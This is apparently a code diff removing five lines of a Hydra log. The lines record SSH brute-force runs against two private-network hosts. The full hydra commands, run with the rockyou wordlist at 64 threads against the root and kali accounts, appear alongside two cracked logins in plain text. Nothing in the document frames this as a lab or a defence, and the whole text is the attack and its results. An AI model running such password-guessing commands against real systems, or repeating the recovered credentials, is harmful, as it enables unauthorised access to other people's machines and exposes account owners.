@@ -1,5 +1,0 @@
-# Hydra v9.5 run at 2023-12-19 13:15:55 on 192.168.1.151 ssh (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.151:22)
-[22][ssh] host: 192.168.1.151   login: root   password: Cmonster2006
-# Hydra v9.5 run at 2023-12-19 13:33:30 on 192.168.1.151 ssh (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.151)
-# Hydra v9.5 run at 2023-12-19 13:41:55 on 192.168.1.91 ssh (hydra -l kali -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.91)
-[22][ssh] host: 192.168.1.91   login: kali   password: kali
